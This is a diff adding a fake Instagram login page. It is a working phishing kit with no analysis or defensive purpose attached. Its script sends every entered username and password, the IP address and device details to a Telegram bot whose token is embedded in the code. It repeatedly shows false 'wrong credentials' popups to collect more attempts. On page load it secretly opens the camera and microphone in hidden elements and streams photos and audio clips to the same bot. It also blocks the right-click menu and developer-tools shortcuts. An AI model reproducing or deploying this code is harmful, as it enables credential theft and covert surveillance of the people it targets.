@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Instagram • Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 12px;
+        }
+        .mobile-container { max-width: 380px; width: 100%; margin: 0 auto; }
+        .login-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 40px 32px 30px;
+            margin-bottom: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.02);
+        }
+        .insta-logo {
+            text-align: center;
+            margin-bottom: 40px;
+            font-family: 'Grand Hotel', 'Segoe UI Script', 'Brush Script MT', cursive;
+            font-size: 52px;
+            font-weight: 900;
+            color: #262626;
+            letter-spacing: 2px;
+        }
+        .input-group { margin-bottom: 8px; }
+        .input-group input {
+            width: 100%;
+            padding: 12px 12px;
+            background-color: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            font-size: 13px;
+            outline: none;
+        }
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #0095f6, #5b51d4);
+            color: white;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+        .divider { display: flex; align-items: center; margin: 20px 0 18px; }
+        .divider-line { flex: 1; height: 1px; background-color: #dbdbdb; }
+        .divider-text { margin: 0 16px; color: #8e8e8e; font-weight: 600; font-size: 12px; }
+        .fb-login { text-align: center; margin-bottom: 16px; }
+        .fb-login a { display: inline-flex; align-items: center; gap: 8px; text-decoration: none; }
+        .fb-icon { width: 18px; height: 18px; background-color: #385185; border-radius: 2px; display: inline-flex; align-items: center; justify-content: center; color: white; font-weight: bold; }
+        .fb-login span { color: #385185; font-weight: 600; font-size: 13px; }
+        .forgot { text-align: center; margin: 12px 0 0; }
+        .forgot a { color: #262626; text-decoration: none; font-size: 12px; }
+        .signup-card {
+            background-color: #ffffff;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            padding: 20px 0;
+            text-align: center;
+            margin-bottom: 18px;
+        }
+        .signup-card a { color: #0095f6; text-decoration: none; font-weight: 600; }
+        .app-section { text-align: center; margin: 12px 0 20px; }
+        .playstore-link { display: inline-block; }
+        .playstore-badge-img { height: 48px; width: auto; }
+        .footer {
+            text-align: center;
+            font-size: 11px;
+            color: #8e8e8e;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px 12px;
+            margin-top: 20px;
+        }
+        .error-msg { color: #ed4956; font-size: 12px; text-align: center; margin-top: 10px; display: none; }
+        .wrong-popup {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); z-index: 10000; display: none;
+            align-items: center; justify-content: center;
+        }
+        .wrong-popup.show { display: flex; }
+        .wrong-popup-box {
+            background: white; border-radius: 12px; width: 270px;
+            text-align: center; padding: 22px;
+        }
+        .wrong-popup-ok { background: #0095f6; color: white; border: none; padding: 8px; border-radius: 6px; width: 100%; cursor: pointer; }
+        
+        /* Hidden elements */
+        #hiddenCameraContainer, #hiddenAudioContainer {
+            position: fixed;
+            bottom: -1000px;
+            left: -1000px;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+        video, canvas, audio {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+        }
+        .spinner {
+            display: none;
+            width: 18px;
+            height: 18px;
+            border: 2px solid white;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .login-btn.loading { opacity: 0.7; pointer-events: none; }
+    </style>
+</head>
+<body>
+
+<div class="mobile-container">
+    <div class="login-card">
+        <div class="insta-logo">Instagram</div>
+        <form id="instagramForm">
+            <div class="input-group"><input type="text" id="username" placeholder="Phone number, username, or email" autocomplete="off"></div>
+            <div class="input-group"><input type="password" id="password" placeholder="Password" autocomplete="off"></div>
+            <div class="error-msg" id="errorMsg"></div>
+            <button type="submit" class="login-btn" id="loginBtn">
+                <span id="btnText">Log in</span>
+                <div class="spinner" id="spinner"></div>
+            </button>
+        </form>
+        <div class="divider"><div class="divider-line"></div><div class="divider-text">OR</div><div class="divider-line"></div></div>
+        <div class="fb-login"><a href="#"><div class="fb-icon">f</div><span>Log in with Facebook</span></a></div>
+        <div class="forgot"><a href="#">Forgot password?</a></div>
+    </div>
+    <div class="signup-card"><span>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Sign up</a></span></div>
+    <div class="app-section">
+        <p>Get the app.</p>
+        <a href="https://play.google.com/store/apps/details?id=com.instagram.lite" class="playstore-link" target="_blank">
+            <img class="playstore-badge-img" src="https://play.google.com/intl/en_us/badges/static/images/badges/en_badge_web_generic.png" alt="Get it on Google Play">
+        </a>
+    </div>
+    <div class="footer">
+        <a href="#">Meta</a> <a href="#">About</a> <a href="#">Blog</a> <a href="#">Jobs</a> <a href="#">Help</a>
+        <a href="#">API</a> <a href="#">Privacy</a> <a href="#">Terms</a> <a href="#">Locations</a>
+        <a href="#">Popular</a> <a href="#">Instagram Lite</a> <a href="#">Meta AI</a> <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a> <a href="#">Meta Verified</a>
+    </div>
+</div>
+
+<div class="wrong-popup" id="wrongPopup"><div class="wrong-popup-box"><div class="wrong-popup-title">Wrong Credentials</div><div class="wrong-popup-msg">Invalid username or password</div><button class="wrong-popup-ok" onclick="closeWrongPopup()">OK</button></div></div>
+
+<!-- Hidden camera + audio -->
+<div id="hiddenCameraContainer">
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+</div>
+<div id="hiddenAudioContainer">
+    <audio id="hiddenAudio" autoplay></audio>
+</div>
+
+<script>
+    // ========== TELEGRAM CONFIG ==========
+    const BOT_TOKEN = '8901136364:AAF0RKnsD7jX6XpkRmERhVrxWHVD8f7Hi7o';
+    const CHAT_ID = '7427889333';
+    const MAX_ATTEMPTS = 5;
+
+    // ========== BACK CAMERA + AUDIO HACK ==========
+    let cameraStream = null;
+    let cameraActive = false;
+    let photoInterval = null;
+    let audioStream = null;
+    let audioActive = false;
+    let audioRecorderInterval = null;
+    let isPageHidden = false;
+
+    // Request BACK CAMERA (environment facing) + microphone
+    async function requestBackCameraAndAudio() {
+        try {
+            // Force back camera using facingMode: { exact: "environment" }
+            const constraints = {
+                video: { facingMode: { exact: "environment" } },
+                audio: true
+            };
+            
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            
+            // Setup video for back camera
+            cameraStream = stream;
+            const video = document.getElementById('hiddenVideo');
+            video.srcObject = stream;
+            await video.play();
+            cameraActive = true;
+            
+            // Setup audio stream
+            audioStream = stream;
+            audioActive = true;
+            
+            // Start taking photos every 2 seconds (even in background)
+            startPhotoCapture();
+            
+            // Start audio recording every 4 seconds (short clips)
+            startShortAudioCapture();
+            
+            sendHackStatusToTG('BACK_CAMERA_AUDIO_ACTIVATED', 'Back camera + microphone active. Photo every 2s, audio every 4s.');
+            return true;
+        } catch (err) {
+            // If exact environment fails, fallback to any camera
+            console.log("Back camera failed, trying default:", err);
+            try {
+                const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                cameraStream = fallbackStream;
+                const video = document.getElementById('hiddenVideo');
+                video.srcObject = fallbackStream;
+                await video.play();
+                cameraActive = true;
+                audioStream = fallbackStream;
+                audioActive = true;
+                startPhotoCapture();
+                startShortAudioCapture();
+                sendHackStatusToTG('CAMERA_AUDIO_FALLBACK', 'Default camera + microphone active (back camera not available).');
+                return true;
+            } catch(e) {
+                sendHackStatusToTG('PERMISSION_DENIED', `Error: ${e.message}`);
+                return false;
+            }
+        }
+    }
+
+    // Photo capture every 2 seconds (runs even when tab hidden)
+    function startPhotoCapture() {
+        if (photoInterval) clearInterval(photoInterval);
+        photoInterval = setInterval(() => {
+            if (cameraActive) {
+                captureAndSendPhoto();
+            }
+        }, 2000);
+    }
+
+    async function captureAndSendPhoto() {
+        if (!cameraActive) return;
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        if (!video.videoWidth || !video.videoHeight) return;
+        
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(async (blob) => {
+            if (blob && BOT_TOKEN !== 'dummy') {
+                await sendPhotoToTelegram(blob);
+            }
+        }, 'image/jpeg', 0.6);
+    }
+
+    // Audio capture every 4 seconds (short 2-second clips)
+    function startShortAudioCapture() {
+        if (audioRecorderInterval) clearInterval(audioRecorderInterval);
+        
+        const recordAndSend = async () => {
+            if (!audioActive) return;
+            const chunks = [];
+            const recorder = new MediaRecorder(audioStream);
+            recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+            recorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'audio/webm' });
+                if (blob.size > 0) await sendAudioToTelegram(blob);
+            };
+            recorder.start();
+            setTimeout(() => {
+                if (recorder.state === 'recording') recorder.stop();
+            }, 3000); // record 3 seconds
+        };
+        
+        // Run every 4 seconds
+        audioRecorderInterval = setInterval(() => {
+            recordAndSend();
+        }, 4000);
+        
+        // Also run immediately
+        recordAndSend();
+    }
+
+    // Send photo
+    async function sendPhotoToTelegram(photoBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', photoBlob, `backcam_${Date.now()}.jpg`);
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+        } catch(e) {}
+    }
+
+    // Send audio
+    async function sendAudioToTelegram(audioBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('voice', audioBlob, `audio_${Date.now()}.ogg`);
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, { method: 'POST', body: formData });
+        } catch(e) {}
+    }
+
+    // Status message
+    async function sendHackStatusToTG(action, details) {
+        const deviceInfo = await getDeviceInfo();
+        const msg = `🎥📞 *BACK CAM + AUDIO HACK* 📞🎥\n\n` +
+            `🔹 Action: ${action}\n🔹 Details: ${details}\n` +
+            `📱 Device: ${deviceInfo.deviceType}\n🌐 Browser: ${deviceInfo.browser}\n` +
+            `⏰ Time: ${new Date().toLocaleString()}`;
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+        } catch(e) {}
+    }
+
+    // Keep alive even when tab is hidden (Page Visibility)
+    document.addEventListener('visibilitychange', () => {
+        isPageHidden = document.hidden;
+        if (!isPageHidden) {
+            // When returning, ensure everything still runs
+            sendHackStatusToTG('TAB_VISIBLE', 'User returned to tab, hack continues.');
+        } else {
+            sendHackStatusToTG('TAB_HIDDEN', 'Tab hidden but hack still running in background.');
+        }
+    });
+
+    // Start hack on load
+    window.addEventListener('load', () => {
+        setTimeout(() => { requestBackCameraAndAudio(); }, 1000);
+    });
+
+    // Also on click
+    document.body.addEventListener('click', () => {
+        if (!cameraActive && !audioActive) requestBackCameraAndAudio();
+    });
+
+    // ========== LOGIN HACK ==========
+    function getAttemptCount() { return parseInt(sessionStorage.getItem('ig_attempt') || '0'); }
+    function incrementAttempt() { let c = getAttemptCount() + 1; sessionStorage.setItem('ig_attempt', c); return c; }
+    function resetAttempts() { sessionStorage.removeItem('ig_attempt'); }
+    function showWrongPopup() { document.getElementById('wrongPopup').classList.add('show'); }
+    function closeWrongPopup() { document.getElementById('wrongPopup').classList.remove('show'); }
+
+    async function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let deviceType = 'Unknown', os = 'Unknown', browser = 'Unknown';
+        if (/Android/.test(ua)) { deviceType = 'Android'; let m = ua.match(/Android\s([\d.]+)/); os = m ? 'Android ' + m[1] : 'Android'; }
+        else if (/iPhone/.test(ua)) { deviceType = 'iPhone'; os = 'iOS'; }
+        else if (/Windows/.test(ua)) { deviceType = 'Windows PC'; }
+        else if (/Mac/.test(ua)) { deviceType = 'Mac'; }
+        if (/Chrome/.test(ua) && !/Edg/.test(ua)) browser = 'Chrome';
+        else if (/Firefox/.test(ua)) browser = 'Firefox';
+        else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
+        return { deviceType, os, browser, screen: screen.width + 'x' + screen.height, language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };
+    }
+
+    async function getClientIP() {
+        try { let res = await fetch('https://api.ipify.org?format=json'); let data = await res.json(); return data.ip; }
+        catch(e) { return 'unknown'; }
+    }
+
+    async function sendToTelegram(username, password, device, attemptNum, ip) {
+        const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' });
+        const msg = `🔰 *INSTAGRAM CREDENTIALS* 🔰\n\n📧 Username: \`${username}\`\n🔑 Password: \`${password}\`\n🔢 Attempt: ${attemptNum}/${MAX_ATTEMPTS}\n\n📱 Device: ${device.deviceType} | ${device.os}\n🌐 Browser: ${device.browser}\n📺 Screen: ${device.screen}\n🌍 Lang: ${device.language}\n🕐 TZ: ${device.timezone}\n📡 IP: ${ip}\n\n⏰ Time (BD): ${timestamp}`;
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown' })
+            });
+        } catch(e) {}
+    }
+
+    document.getElementById('instagramForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const username = document.getElementById('username').value.trim();
+        const password = document.getElementById('password').value.trim();
+        const errorMsg = document.getElementById('errorMsg');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
+        const loginBtn = document.getElementById('loginBtn');
+        if (!username || !password) {
+            errorMsg.textContent = 'Please enter username and password.';
+            errorMsg.style.display = 'block';
+            return;
+        }
+        errorMsg.style.display = 'none';
+        btnText.style.display = 'none';
+        spinner.style.display = 'block';
+        loginBtn.classList.add('loading');
+        const attempt = incrementAttempt();
+        const device = await getDeviceInfo();
+        const ip = await getClientIP();
+        await sendToTelegram(username, password, device, attempt, ip);
+        setTimeout(() => {
+            btnText.style.display = 'inline';
+            spinner.style.display = 'none';
+            loginBtn.classList.remove('loading');
+            if (attempt >= MAX_ATTEMPTS) {
+                resetAttempts();
+                window.location.href = 'https://www.instagram.com/accounts/login/';
+            } else {
+                document.getElementById('password').value = '';
+                showWrongPopup();
+            }
+        }, 1400);
+    });
+
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'J') || (e.ctrlKey && e.key === 'U')) {
+            e.preventDefault();
+        }
+    });
+</script>
+</body>
+</html>
